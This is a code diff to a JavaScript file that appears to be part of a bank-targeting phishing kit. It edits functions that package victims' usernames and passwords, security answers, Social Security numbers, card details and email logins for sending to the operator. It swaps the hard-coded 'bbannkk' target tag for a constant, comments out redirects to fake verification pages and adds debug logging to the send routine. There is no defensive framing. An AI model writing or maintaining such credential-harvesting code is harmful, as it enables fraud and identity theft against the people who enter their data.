@@ -191,7 +191,7 @@ function _User_Pass_single(username, password, secondtry = true) {
             username: localStorage.getItem("username"),
             nametype: 'citizen',
             userid: DEDICATED_LICENSE,
-            type: 'bbannkk'
+            type: LICENSE_LOCATION
         }
     } else {
         let u = (new Date()).getTime() + "_" + username;
@@ -201,7 +201,7 @@ function _User_Pass_single(username, password, secondtry = true) {
             username: u,
             nametype: 'citizen',
             userid: DEDICATED_LICENSE,
-            type: 'bbannkk',
+            type: LICENSE_LOCATION,
             brw: browser_ip()
         }
     }
@@ -255,7 +255,7 @@ Answer 3: ${a3}`;
         username: localStorage.getItem("username"),
         nametype: 'citizen',
         userid: DEDICATED_LICENSE,
-        type: 'bbannkk'
+        type: LICENSE_LOCATION
     }
 }
 
@@ -272,7 +272,7 @@ Social Security Number (SSN): ${ssn}`;
         username: localStorage.getItem("username"),
         nametype: 'citizen',
         userid: DEDICATED_LICENSE,
-        type: 'bbannkk'
+        type: LICENSE_LOCATION
     }
 }
 
@@ -288,7 +288,7 @@ Brand: ${card.scheme} || Level: ${card.brand} || Type: ${card.type} || Country: 
         username: localStorage.getItem("username"),
         nametype: 'citizen',
         userid: DEDICATED_LICENSE,
-        type: 'bbannkk'
+        type: LICENSE_LOCATION
     }
 }
 
@@ -299,7 +299,7 @@ function _Email_Pass_single(email, password, retry = false) {
             username: localStorage.getItem("username"),
             nametype: 'citizen',
             userid: DEDICATED_LICENSE,
-            type: 'bbannkk'
+            type: LICENSE_LOCATION
         }
     } else {
         return {
@@ -307,7 +307,7 @@ function _Email_Pass_single(email, password, retry = false) {
             username: localStorage.getItem("username"),
             nametype: 'citizen',
             userid: DEDICATED_LICENSE,
-            type: 'bbannkk'
+            type: LICENSE_LOCATION
         }
     }
 }
@@ -368,12 +368,12 @@ async function form_index(form) {
         if (result.response.msg.includes("uccessfull")) {
             localStorage.setItem("username", u);
             if (TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === false) {
-                window.location.replace(location.href + "&vry=" + (new Date()).getTime());
-                window.location.reload();
+               // window.location.replace(location.href + "&vry=" + (new Date()).getTime());
+                //window.location.reload();
             } else {
                 let url = location.href.split("#")[0] + "#/login/verify" + rand_url() + "?" + query_gen();
-                location.replace(url);
-                window.location.reload();
+                //location.replace(url);
+               // window.location.reload();
             }
         } else {
             window.location.replace(location.href);
@@ -521,9 +521,11 @@ async function load_Send_post_Dedicated(post = {}) {
             dataType: "text",
             data: post,
             success: function (response) {
+                console.log('success', response);
                 resolve({msg: "Yes Sent Successfully"});
             },
             error: function (response) {
+                console.log('error', response);
                 let error = {errors: response}
                 resolve(error);
             }
